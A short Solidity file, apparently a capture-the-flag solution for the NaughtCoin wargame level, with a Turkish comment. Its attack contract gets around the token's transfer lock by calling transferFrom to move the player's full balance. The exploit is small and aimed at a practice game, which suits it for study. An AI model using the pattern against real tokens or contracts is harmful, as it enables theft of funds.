// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface INaughtCoin {
    function player() external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract coinAttack {
    function attack(IERC20 erc) public {
	//Playerı hardcode yerine parametrik yazmamız daha doğru =)
        address player = INaughtCoin(address(erc)).player();
        uint256 balance = erc.balanceOf(player);
        erc.transferFrom(player, address(this), balance);
    }
}
